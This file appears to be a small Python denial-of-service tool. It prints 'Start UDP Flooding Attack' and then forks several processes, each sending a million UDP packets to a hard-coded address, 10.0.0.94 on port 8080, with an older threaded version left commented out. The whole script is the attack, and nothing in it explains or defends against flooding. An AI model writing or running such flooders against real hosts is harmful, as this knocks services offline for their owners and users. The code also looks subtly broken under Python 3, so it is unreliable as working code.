import socket, threading, os

IP = "10.0.0.94"
PORT = 8080
MESSAGE = "UDP Packet Flooding"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("==========================")
print("Start UDP Flooding Attack")
print("==========================")

"""
def attack():
    i = 0
    while i < 1000000  :
        i = i + 1
        sock.sendto(MESSAGE, (IP, PORT))
        if i % 10000 == 0 :
            print("Send UDP Packet : "+str(i))

i = 0

for i in range(0,1):
    th = threading.Thread(target=attack)
    th.start()
    th.join()
"""

i = 0

for i in range(0,3):

    pid = os.fork()

    if pid == 0 :
        i = 0
        while i < 1000000  :
            i = i + 1
            sock.sendto(MESSAGE, (IP, PORT))
            if i % 10000 == 0 :
                print("Send UDP Packet : "+str(i))

    else :
        i = 0
        while i < 1000000  :
            i = i + 1
            sock.sendto(MESSAGE, (IP, PORT))
            if i % 10000 == 0 :
                print("Send UDP Packet : "+str(i))

